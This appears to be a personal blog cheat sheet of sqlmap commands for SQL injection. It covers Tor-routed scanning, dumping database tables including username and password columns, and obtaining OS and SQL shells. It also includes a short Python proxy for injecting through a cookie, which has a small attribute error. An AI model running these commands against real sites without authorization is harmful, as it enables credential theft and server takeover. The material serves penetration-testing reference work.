---
layout: post
title: SQLMap Notes
date: 2018-08-28 22:38 +0800
tags:
  - Security
---

SQLMap is a lazy tool for pentester to exploit databases.

{% include toc.html %}

### Basic

```shell
sqlmap -u "http://testsite.com/login.php"
sqlmap -u "http://testsite.com/login.php" --tor --tor-type=SOCKS5
sqlmap -u "http://testsite.com/login.php" --time-sec 15 # manually setting the return time
sqlmap -u "http://testsite.com/login.php" --random-agent
sqlmap -u "http://testsite.com/login.php" --data 'username=fuck&password=fuck'
sqlmap -u "http://testsite.com/login.php" -r request_template.txt -p the_parameter_name

```

### Dump

```shell
sqlmap -u "http://testsite.com/login.php" --dbs
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --dump # dump content of table user
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
sqlmap -u "http://testsite.com/login.php" -D site_db -T users -C username,password --dump # dump only some columns

sqlmap -u "http://testsite.com/login.php" \
       --method "POST" --data "username=admin&password=admin&submit=Submit" \
       -D social_mccodes -T users --dump
```

### Shell

```shell
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --os-shell # get OS shell
sqlmap --dbms=mysql -u "http://testsite.com/login.php" --sql-shell # get SQL shell
```

### Proxy

Writing a tiny proxy for sqlmap

```python
import bottle, requests

sess = requests.session()

@bottle.get('/')
def index():
    sess.cookie.set('injectable_cookie_name', bottle.request.query('x'))
    return sess.get('http://the-target.url/').text

bottle.run(host='0.0.0.0', port=8888, server='paste')
```

### More

- https://github.com/aramosf/sqlmap-cheatsheet/blob/master/sqlmap%20cheatsheet%20v1.0-SBD.pdf
